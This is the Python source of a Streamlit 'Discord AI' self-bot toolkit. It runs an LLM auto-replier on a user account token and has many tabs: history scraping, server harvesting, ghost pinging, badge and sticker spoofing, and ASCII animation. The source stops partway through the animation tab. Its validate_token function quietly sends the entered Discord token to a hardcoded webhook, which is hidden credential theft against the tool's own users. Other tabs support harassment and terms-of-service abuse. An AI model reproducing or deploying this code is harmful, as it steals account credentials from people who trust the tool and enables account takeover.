import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64
import json
import re
import cv2        # Added for advanced image/GIF frame array parsing
import tempfile   # Added for secure, multi-platform disk stream caching
import math       # Added for quadratic aspect ratio bound checks
from duckduckgo_search import DDGS

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")

# --- SECURE LOGIN SYSTEM ---
MASTER_KEY = st.secrets["MASTER_KEY"]
CODE_FILE = "active_code.txt"
MEMORY_FILE = "conversation_memory.json"

# --- GLOBAL ACCESS FUNCTIONS ---
def set_global_code(code):
    with open(CODE_FILE, "w") as f:
        f.write(f"{code},{time.time()}")

def get_global_code():
    if os.path.exists(CODE_FILE):
        try:
            with open(CODE_FILE, "r") as f:
                data = f.read().split(",")
                if len(data) == 2:
                    return data[0], float(data[1])
        except:
            return None, None
    return None, None

def log_access_event():
    with open("access_log.txt", "a") as f:
        f.write(f"Access Granted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# --- MEMORY PERSISTENCE FUNCTIONS ---
def save_memory(channel_id, summary):
    memory_data = {}
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
            except: pass
    memory_data[str(channel_id)] = {"summary": summary, "last_updated": time.time()}
    with open(MEMORY_FILE, "w") as f:
        json.dump(memory_data, f)

def load_memory(channel_id):
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
                return memory_data.get(str(channel_id), {}).get("summary", "No previous memory.")
            except: pass
    return "No previous memory."

# Initialize local session state
if "access_granted" not in st.session_state:
    st.session_state.access_granted = False

# --- REVOKE ALL GLOBAL CHECK ---
shared_code, shared_time = get_global_code()
if not shared_code:
    st.session_state.access_granted = False

# --- UPDATED INACTIVITY LOGIC ---
if shared_code and shared_time:
    if st.session_state.access_granted:
        if time.time() - shared_time > 30:
            set_global_code(shared_code)
    
    if time.time() - shared_time > 600:
        if os.path.exists(CODE_FILE):
            os.remove(CODE_FILE)
        st.session_state.access_granted = False

# --- SIDEBAR LOGIN CONTROL ---
with st.sidebar:
    st.header("🔐 System Access")
    admin_input = st.text_input("Owner Master Key", type="password", help="Only the owner uses this to generate the session code.")
    
    if admin_input == MASTER_KEY:
        col_gen, col_rev = st.columns(2)
        with col_gen:
            if st.button("🎲 Generate Code"):
                new_code = str(random.randint(100000, 999999))
                set_global_code(new_code)
                st.success(f"CODE: {new_code}")
        with col_rev:
            if st.button("🚫 Revoke All"):
                if os.path.exists(CODE_FILE):
                    os.remove(CODE_FILE)
                st.session_state.access_granted = False
                st.warning("Access Revoked")
                st.rerun()
    
    st.divider()
    
    if not st.session_state.access_granted:
        user_code_attempt = st.text_input("Enter 6-Digit Access Code")
        if st.button("Unlock System"):
            current_valid_code, _ = get_global_code()
            if current_valid_code and user_code_attempt == current_valid_code:
                st.session_state.access_granted = True
                log_access_event()
                st.rerun()
            else:
                st.error("Invalid or Expired Code")

# --- GATEKEEPER CHECK ---
if not st.session_state.access_granted:
    st.title("🛡️ Discord AI - Locked")
    st.info("Please contact the owner for the current global 6-digit access code.")
    st.stop() 

# --- START OF ORIGINAL CODE ---
st.title("Discord AI Bot & History Scraper")

# --- Initialize Session State ---
for key, val in {
    "bot_running": False, "tokens": 3.0, "last_time": time.time(),
    "memory": {}, "processed_dms": set(), "last_webhook_token": None,
    "last_activity": time.time(), "typing_active": False, "bio_anim_active": False,
    "last_ai_content": None, "bot_start_time": time.time(),
    "last_msg_id": None, "debug_log": "System Ready..."
}.items():
    if key not in st.session_state:
        st.session_state[key] = val

# --- Helper Functions ---
def jitter_delay(min_s=0.1, max_s=0.5):
    time.sleep(random.uniform(min_s, max_s))

def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

def safety_filter(text):
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself", "harming myself"]
    for term in harmful_terms:
        if term in text.lower():
            return False
    return True

# --- UPDATED BACKGROUND REPLY ---
def background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool, mention_only):
    try:
        channel_id = latest['channel_id']
        author_username = latest['author']['username'].lower()
        author_id = str(latest['author']['id'])
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = author_id == str(owner_id_input)

        if mention_only and not is_owner:
            if f"<@{my_id}>" not in content and f"<@!{my_id}>" not in content:
                return False

        requests.post(typing_url, headers=headers)
        
        if emoji_pool:
            reaction_emoji = random.choice(emoji_pool)
        else:
            reaction_emoji = "👑" if is_owner else "💬"
            
        if reaction_delay > 0 and not is_owner: time.sleep(reaction_delay)
        add_reaction(channel_id, msg_id, reaction_emoji, headers)

        long_term_mem = load_memory(channel_id)
        urls = re.findall(r'(https?://[^\s]+)', content)
        url_context = ""
        if urls:
            url_context = f"\n[SYSTEM NOTE: The user provided a link: {urls[0]}. If it's a known site, discuss its likely content.]"

        chat_history = [{"role": "system", "content": f"PERSONA: {system_prompt}. Current memory: {long_term_mem}. {url_context}"}]
        
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
        
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                sender = f"[{m['author']['username']}]: " if role == "user" else ""
                chat_history.append({"role": role, "content": f"{sender}{m['content']}"})

        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        
        new_summary_prompt = f"Summarize key points in 2 sentences: {reply}"
        summary_resp = client.chat.completions.create(model="openrouter/free", messages=[{"role": "user", "content": new_summary_prompt}])
        save_memory(channel_id, summary_resp.choices[0].message.content)

        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner: time.sleep(resp_delay)
            st.session_state.last_ai_content = reply.strip()
            requests.post(discord_url, json={"content": reply}, headers=headers)
            log_to_csv(author_username, content, "Reply Sent")
            return True
    except Exception as e:
        st.session_state.debug_log = f"Error: {str(e)}"
        return False

# --- Sidebar Bot Settings ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
            my_id = user_info['id']
        else:
            st.error("❌ Invalid Token")
            my_username, my_id = None, None
    else: 
        my_username, my_id = None, None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    st.divider()
    st.header("⚙️ Bot Settings")
    mention_only = st.toggle("Mention-Only Mode (429 Protection)", value=False)
    
    if st.session_state.bot_running:
        hb = "🟢" if int(time.time()) % 2 == 0 else "⚪"
        st.markdown(f"### {hb} Connection Status")
        status_box = st.empty()
    
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.1, 5.0, 1.0)
    resp_delay = st.slider("Response Delay (Seconds)", 0.0, 5.0, 0.0)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=5, value=0)
    
    c_safety, c_restart = st.columns(2)
    with c_safety:
        enable_safety = st.toggle("Enable Safety Filter", value=True)
    with c_restart:
        auto_restart_10m = st.toggle("10m Auto-Restart", value=False)
        
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

# --- Tabs ---
tabs_list = [
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester", 
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker", 
    "🔊 Soundboard Spoofer", "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander", 
    "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing", "🔎 OSINT Search", 
    "🎭 Status Spoofer", "🖼️ Sticker Spoofer", "📦 Large File Bridge", "👻 Invisible Identity",
    "🌀 Bio Animator", "👻 Ghost Pinger", "📋 Server Cloner","NITRO BADGE", "🎬 2D Animator"
]
tabs = st.tabs(tabs_list)

# --- TAB 1: BOT CONTROL ---
with tabs[0]:
    col1, col2 = st.columns(2)
    with col1:
        persona_dict = {
            "Custom": "", "Helpful Assistant": "You are a helpful assistant.",
            "Sarcastic Bot": "You are a sarcastic, witty bot.", "Technical Support": "You are a technical expert.",
            "Chaos Mode": "Short and weird replies.", "Cyberpunk Hacker": "Netrunner persona.",
            "Stoic Philosopher": "Calm and logical.", "Gamer Streamer": "Hype, POG, L, W.",
            "The Detective": "Noir film character."
        }
        selected_persona = st.selectbox("Preset Personas", list(persona_dict.keys()))
        default_prompt = persona_dict[selected_persona] if selected_persona != "Custom" else "You are a helpful assistant."
        system_prompt = st.text_area("System Prompt", value=default_prompt)
        owner_id_input = st.text_input("Owner Discord ID").strip()
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords")
        allowed_input = st.text_input("Allowed Users", value="everyone")
        blacklisted_users_input = st.text_input("Blacklisted Users")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            st.session_state.bot_start_time = time.time()
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            st.rerun()

    if st.session_state.bot_running:
        status_box.info("Status: 🟢 ONLINE / IDLE")
        headers = get_headers(token)
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        
        try:
            r = requests.get(discord_url, headers=headers, timeout=3)
            if r.status_code == 200:
                msgs = r.json()
                if msgs and isinstance(msgs, list):
                    latest = msgs[0]
                    if latest['id'] != st.session_state.last_msg_id:
                        st.session_state.last_msg_id = latest['id']
                        if latest['content'] != st.session_state.last_ai_content:
                            background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool, mention_only)
            time.sleep(poll_speed)
            st.rerun()
        except: 
            time.sleep(poll_speed)
            st.rerun()

# --- TAB 21: BIO ANIMATOR ---
with tabs[20]:
    st.header("🌀 Bio Animator")
    st.info("Rotates your bio text. Warning: Changing too fast may lead to a temporary rate limit.")
    bio_frames = st.text_area("Bio Frames (One per line)", "Coding...\nDeveloping...\nDiscord Hacking...")
    anim_speed = st.slider("Animation Speed (Seconds)", 30, 300, 60)
    
    if st.button("▶️ Start Bio Animation", use_container_width=True):
        st.session_state.bio_anim_active = True
    if st.button("🛑 Stop Animation", use_container_width=True):
        st.session_state.bio_anim_active = False

    if st.session_state.bio_anim_active and token:
        frames = [f.strip() for f in bio_frames.split("\n") if f.strip()]
        if frames:
            current_frame = frames[int(time.time() / anim_speed) % len(frames)]
            requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(token), json={"bio": current_frame})
            st.write(f"Current Bio: **{current_frame}**")
            time.sleep(10) # Internal buffer
            st.rerun()

# --- TAB 22: GHOST PINGER ---
with tabs[21]:
    st.header("👻 Ghost Pinger")
    st.info("Sends a mention and deletes it immediately. The target gets a notification but can't see the message.")
    ghost_target_id = st.text_input("User ID to Ghost Ping")
    ghost_ch_id = st.text_input("Channel ID", value=channel_id_input, key="ghost_ping_ch")
    
    if st.button("💀 Fire Ghost Ping", use_container_width=True):
        if token and ghost_target_id:
            h = get_headers(token)
            ping_url = f"https://discord.com/api/v9/channels/{ghost_ch_id}/messages"
            res = requests.post(ping_url, headers=h, json={"content": f"<@{ghost_target_id}>"})
            if res.status_code == 200:
                msg_id = res.json()['id']
                requests.delete(f"{ping_url}/{msg_id}", headers=h)
                st.success("Ghost Ping Delivered.")

# --- TAB 23: SERVER CLONER ---
with tabs[22]:
    st.header("📋 Server Structure Cloner")
    st.info("Exports all channel names, categories, and roles from a server to a JSON file.")
    clone_guild_id = st.text_input("Server (Guild) ID to Clone")
    
    if st.button("📂 Export Server Structure", use_container_width=True):
        if token and clone_guild_id:
            h = get_headers(token)
            guild_data = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}", headers=h).json()
            channels = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}/channels", headers=h).json()
            
            clone_package = {
                "name": guild_data.get("name"),
                "roles": guild_data.get("roles"),
                "channels": channels
            }
            st.download_button("Download Clone JSON", data=json.dumps(clone_package, indent=4), file_name=f"clone_{clone_guild_id}.json")

# --- OTHER TABS ---
with tabs[15]:
    st.header("🔎 OSINT Search Engine")
    q_col, t_col = st.columns([3, 1])
    with q_col: search_query = st.text_input("Enter search query")
    with t_col: search_type = st.selectbox("Search Scope", ["Web", "News", "Images"])
    if st.button("Execute Intelligence Search", use_container_width=True):
        if search_query:
            with DDGS() as ddgs:
                if search_type == "Web":
                    results = list(ddgs.text(search_query, max_results=10))
                    for res in results:
                        st.markdown(f"### [{res['title']}]({res['href']})")
                        st.write(res['body'])
                        st.divider()
                elif search_type == "News":
                    results = list(ddgs.news(search_query, max_results=10))
                    for res in results:
                        st.info(f"{res['date']} - {res['source']}")
                        st.markdown(f"**[{res['title']}]({res['url']})**")
                        st.write(res['body'])
                        st.divider()
                elif search_type == "Images":
                    results = list(ddgs.images(search_query, max_results=10))
                    cols = st.columns(2)
                    for i, res in enumerate(results):
                        with cols[i % 2]: st.image(res['image'], caption=res['title'])

with tabs[16]:
    st.header("🎭 Rich Presence (NTTS Style)")
    app_id = st.text_input("Application (Client) ID", placeholder="1234567890...")
    game_name = st.text_input("Main Heading", value="about me")
    details = st.text_input("Sub-heading", value="Helping gamers out")
    st.divider()
    col_img, col_btn = st.columns(2)
    with col_img:
        large_image_key = st.text_input("Large Image Asset Key/URL", value="mp:external/...")
        large_text = st.text_input("Image Hover Text", value="Verified")
    with col_btn:
        b1_label = st.text_input("Button 1 Label", value="YouTube Channel")
        b1_url = st.text_input("Button 1 URL", value="https://youtube.com")
        act_status = st.selectbox("Appearance", ["online", "idle", "dnd", "invisible"], key="ntts_status")

    if st.button("✨ Apply NTTS Presence", use_container_width=True):
        if token and app_id:
            headers = get_headers(token)
            payload = {"status": act_status, "activities": [{"type": 0, "application_id": app_id, "name": game_name, "details": details, "assets": {"large_image": large_image_key, "large_text": large_text}, "buttons": [b1_label], "metadata": {"button_urls": [b1_url]}}]}
            res = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
            if res.status_code == 200: st.success("Presence Applied!")
            else: st.error(f"Error: {res.text}")

with tabs[17]:
    st.header("🖼️ Nitro Sticker Spoofer")
    stick_ch = st.text_input("Target Channel ID", value=channel_id_input, key="sticker_ch")
    stick_id = st.text_input("Sticker ID")
    if st.button("🚀 Send Spoofed Sticker", use_container_width=True):
        if stick_id and token:
            h = get_headers(token)
            sticker_url = f"https://cdn.discordapp.com/stickers/{stick_id}.png?size=160"
            requests.post(f"https://discord.com/api/v9/channels/{stick_ch}/messages", headers=h, json={"content": sticker_url})
            st.success("Sticker Sent!")

with tabs[18]:
    st.header("📦 Large File Bridge")
    file_ch = st.text_input("Target Channel ID", value=channel_id_input, key="file_ch")
    uploaded_file = st.file_uploader("Select File")
    if st.button("📤 Upload & Send Link", use_container_width=True):
        if uploaded_file and token:
            with st.spinner("Bridging file..."):
                try:
                    server = requests.get("https://api.gofile.io/getServer").json()['data']['server']
                    up_res = requests.post(f"https://{server}.gofile.io/uploadFile", files={'file': (uploaded_file.name, uploaded_file.getvalue())}).json()
                    dl_url = up_res['data']['downloadPage']
                    requests.post(f"https://discord.com/api/v9/channels/{file_ch}/messages", headers=get_headers(token), json={"content": f"📁 **File:** {uploaded_file.name}\n🔗 {dl_url}"})
                    st.success("Sent!")
                except: st.error("Bridge failure.")

with tabs[19]:
    st.header("👻 Invisible Identity")
    st.code("\u17b5", language="text")
    if st.button("Apply Invisible Bio"):
        if token:
            requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(token), json={"bio": "\u17b5"})
            st.success("Bio Ghosted.")

with tabs[1]:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        res = requests.get(f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}", headers=get_headers(token))
        if res.status_code == 200: st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))

with tabs[2]:
    st.header("🧠 Persistent Memory")
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try: st.json(json.load(f))
            except: st.error("Memory file corrupted.")
    if st.button("Clear Memory File"):
        if os.path.exists(MEMORY_FILE): os.remove(MEMORY_FILE)
        st.success("Memory Nuked.")

with tabs[3]:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID")
    if st.button("📥 Harvest Emojis"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(token)).json()
        if 'emojis' in res:
            for e in res['emojis']:
                url = f"https://cdn.discordapp.com/emojis/{e['id']}.png"
                st.image(url, width=64, caption=f"{e['name']} (ID: {e['id']})")

with tabs[4]:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=channel_id_input, key="emoji_ch")
    emoji_id = st.text_input("Emoji ID")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if emoji_id:
            ext = "gif" if is_animated else "png"
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(token), json={"content": emoji_url})
            st.success("Emoji Sent!")

with tabs[5]:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter User or Server ID")
    if st.button("📅 Decode Timestamp", use_container_width=True):
        if input_id.isdigit():
            timestamp = (int(input_id) >> 22) + 1420070400000
            date_obj = datetime.fromtimestamp(timestamp / 1000.0)
            st.success(f"Creation Date: **{date_obj.strftime('%Y-%m-%d %H:%M:%S')} UTC**")

with tabs[6]:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications", use_container_width=True):
        if token:
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(token)).json()
            if apps:
                for a in apps:
                    app_name = a.get('application', {}).get('name', 'Unknown')
                    with st.expander(f"📲 {app_name}"): st.write(f"**Scopes:** `{', '.join(a.get('scopes', []))}`")

with tabs[7]:
    st.header("🎙️ VC Lurker (Direct Scan)")
    target_guild_id = st.text_input("Server ID", key="lurker_guild")
    target_vc_id = st.text_input("Specific Voice Channel ID", key="lurker_vc")
    if st.button("📡 Scan Voice Channel", use_container_width=True):
        if token and target_guild_id and target_vc_id:
            h = get_headers(token)
            res = requests.get(f"https://discord.com/api/v9/channels/{target_vc_id}", headers=h)
            if res.status_code == 200:
                mem_res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=100", headers=h)
                if mem_res.status_code == 200:
                    members = mem_res.json()
                    found = [{"User": m['user']['username'], "ID": m['user']['id']} for m in members if 'user' in m]
                    st.table(pd.DataFrame(found))

with tabs[8]:
    st.header("🔊 Soundboard Anywhere Spoofer")
    sound_ch_id = st.text_input("Voice Channel ID", value=channel_id_input)
    sound_id = st.text_input("Sound ID")
    sound_guild_id = st.text_input("Source Server ID")
    if st.button("🔊 Fire Sound", use_container_width=True):
        if token and sound_ch_id and sound_id:
            h = get_headers(token)
            sb_url = f"https://discord.com/api/v9/channels/{sound_ch_id}/voice-channel-effects"
            res = requests.post(sb_url, headers=h, json={"sound_id": sound_id, "source_guild_id": sound_guild_id if sound_guild_id else None})
            if res.status_code == 204: st.success("Sound Played!")

with tabs[9]:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(token), json={"house_id": house_map[house]})
        st.success("House Applied")

with tabs[10]:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"):
        u_res = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token)).json()
        st.json(u_res)

with tabs[11]:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL")
    wh_msg = st.text_area("Message content")
    if st.button("Fire"): requests.post(wh_url, json={"content": wh_msg})

with tabs[12]:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=channel_id_input, key="ghost_ch")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    if st.button("🔥 Purge My Messages", use_container_width=True):
        if my_id:
            h = get_headers(token)
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=h).json()
            for m in msgs:
                if m['author']['id'] == my_id:
                    requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=h)
                    time.sleep(1.2)

with tabs[13]:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Your Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "White"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34", "Magenta": "35", "Cyan": "36", "White": "37"}
    if st.button("🖌️ Send Colored Text", use_container_width=True):
        code = color_codes[color_choice]
        ansi_payload = f"```ansi\n\u001b[{code}m{color_text}```"
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": ansi_payload})

with tabs[14]:
    st.header("⏳ Infinite Typing Indicator")
    if st.button("🚀 Start Infinite Typing", use_container_width=True): st.session_state.typing_active = True
    if st.button("🛑 Stop Typing", use_container_width=True): st.session_state.typing_active = False
    if st.session_state.typing_active:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/typing", headers=get_headers(token))
        time.sleep(random.randint(5, 8))
        st.rerun()

# --- NEW TAB: NITRO BADGE SPOOFER ---
with tabs[23]:
    st.header("💎 Nitro Badge Spoofer")
    st.warning("⚠️ Warning: Manipulating account flags is purely cosmetic and local to the API's response. Discord may reset these if they detect the mismatch.")
    
    nitro_bit = 1 
    if st.button("✨ Apply Nitro Badge", use_container_width=True):
        if token:
            h = get_headers(token)
            user_data = requests.get("https://discord.com/api/v9/users/@me", headers=h).json()
            current_flags = user_data.get("flags", 0)
            new_flags = current_flags | nitro_bit
            res = requests.patch("https://discord.com/api/v9/users/@me", headers=h, json={"flags": new_flags})
            
            if res.status_code == 200:
                st.success(f"Flags patched to: {new_flags}. Refresh your client/browser.")
            else:
                st.error(f"Failed to patch: {res.status_code}")

# --- UPDATED TAB: 2D TEXT ANIMATOR (BUILT FOR ALL CUSTOM WIDTHS & LIMITS) ---
with tabs[24]:
    st.header("🎬 2D Text Matrix Animator")
    st.info("Sends a text matrix and rapidly edits it frame-by-frame to create a live 2D flipbook animation in chat.")
    
    anim_ch = st.text_input("Target Channel ID", value=channel_id_input, key="anim_ch_id")
    
    # Pre-built frame animation matrices
    animation_presets = {
        "💃 Cyber Punk Dance Loop": [
            "```\n  \\ \n  \\\\(@)~ \n    ###   \n  _// \\_ \n```",
            "```\n        \n    (@)/ \n   /###  \n  _/  \\  \n```",
            "```\n        \n   _@_   \n  (###)  \n  _/ \\_  \n```",
            "```\n        \n   \\(@)  \n    ###\\ \n    /  \\_\n```",
            "```\n        \n  ~(@)~  \n   ###   \n  _// \\_ \n```",
            "```\n        \n   _(@)_ \n  / ### \\\n    /   \\\n```"
        ],
        "⚽ Bouncing Ball": [
            "```\n[○      ]\n```", "```\n[  ○    ]\n```", "```\n[    ○  ]\n```",
            "```\n[      ○]\n```", "```\n[    ○  ]\n```", "```\n[  ○    ]\n```"
        ],
        "🤖 Robot Face Blink": [
            "```\n  [ O _ O ] \n   /|___|\\  \n```", "```\n  [ - _ - ] \n   /|___|\\  \n```",
            "```\n  [ O _ O ] \n   /|___|\\  \n```", "```\n  [ > _ < ] \n   /|___|\\  \n```"
        ],
        "📡 Loading Radar": [
            "```\n   ⏱️ [|] Loading\n```", "```\n   ⏱️ [/] Loading.\n```",
            "```\n   ⏱️ [-] Loading..\n```", "```\n   ⏱️ [\\] Loading...\n```"
        ]
    }
    
    preset_options = list(animation_presets.keys()) + ["📁 Upload Custom GIF"]
    selected_anim = st.selectbox("Choose Animation Preset", preset_options)
    
    frames = []
    is_engine_ready = True
    
    if selected_anim == "📁 Upload Custom GIF":
        custom_gif = st.file_uploader("Upload an animated .gif file", type=["gif"])
        
        col_w, col_inv = st.columns(2)
        with col_w:
            max_cols = st.slider("Target Max Width (Columns)", min_value=15, max_value=60, value=42, 
                                help="40-45 columns is ideal for avoiding broken layout wrapping on desktop/mobile views.")
        with col_inv:
            invert_contrast = st.toggle("Invert Text Contrast", value=False, 
                                        help="Flip this if dark and light sections look reversed on Discord's theme layout.")
            
        if custom_gif is not None:
            with st.spinner("Analyzing aspect ratio and compiling frames safely..."):
                try:
                    # Cache the memory stream to file temporarily for safe OpenCV frame calculations
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".gif") as tmp:
                        tmp.write(custom_gif.getvalue())
                        tmp_path = tmp.name
                    
                    cap = cv2.VideoCapture(tmp_path)
                    ret, first_frame = cap.read()
                    
                    if not ret:
                        st.error("Could not parse valid image frames from the uploaded GIF.")
                        is_engine_ready = False
                    else:
                        orig_h, orig_w = first_frame.shape[:2]
                        
                        # Apply standard font layout multiplier correction factor (~0.55 aspect for Discord monospace)
                        aspect_ratio_modifier = (orig_h / orig_w) * 0.55
                        
                        # Dynamic Math: Solve maximum allowable width based on the quadratic 2000-character payload barrier
                        R = aspect_ratio_modifier
                        if R > 0:
                            calculated_max_w = (-R + math.sqrt((R**2) - (4 * R * -1942))) / (2 * R)
                            safe_width = min(int(calculated_max_w), max_cols)
                        else:
                            safe_width = max_cols
                            
                        safe_height = max(1, int(safe_width * aspect_ratio_modifier))
                        
                        # Safety Fallback Iteration: Downscale bounds step-by-step until length is safely inside limits
                        while (safe_width + 1) * safe_height + 8 > 1950:
                            safe_width -= 1
                            safe_height = max(1, int(safe_width * aspect_ratio_modifier))
                        
                        st.caption(f"📐 System auto-configured frame canvas resolution to: **{safe_width}x{safe_height}** blocks.")
                        
                        # Handle text density ramp arrays
                        ascii_ramp = " .:-=+*#%@" if not invert_contrast else "@%#*+=-:. "
                        ramp_len = len(ascii_ramp)
                        
                        # Rewind pointer stream back to index zero
                        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                        
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                break
                                
                            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                            resized = cv2.resize(gray, (safe_width, safe_height), interpolation=cv2.INTER_AREA)
                            
                            matrix_lines = []
                            for row in resized:
                                line_chars = "".join([ascii_ramp[int(pixel / 256 * ramp_len)] for pixel in row])
                                matrix_lines.append(line_chars)
                                
                            formatted_block = "```\n" + "\n".join(matrix_lines) + "\n```"
                            frames.append(formatted_block)
                            
                    cap.release()
                    os.unlink(tmp_path)
                    
                    if len(frames) == 0:
                        st.error("No extractable frame data discovered inside the asset bundle.")
                        is_engine_ready = False
                    else:
                        st.success(f"Successfully processed {len(frames)} safe frames! Ready to play.")
                        
                except Exception as e:
                    st.error(f"Engine conversion crash: {str(e)}")
                    is_engine_ready = False
        else:
            is_engine_ready = False
    else:
        frames = animation_presets[selected_anim]

    loop_count = st.slider("Animation Loops", 1, 10, 3)
    frame_delay = st.slider("Frame Delay (Seconds)", 1.0, 3.0, 1.3, 
                            help="Speeds faster than 1.2s risk hitting tight HTTP 429 rate limits.")

    if st.button("🚀 Fire 2D Animation", use_container_width=True, disabled=not is_engine_ready):
        if token and anim_ch and frames:
            h = get_headers(token)
            edit_url = f"https://discord.com/api/v9/channels/{anim_ch}/messages"
            
            # Step 1: Deploy base post container
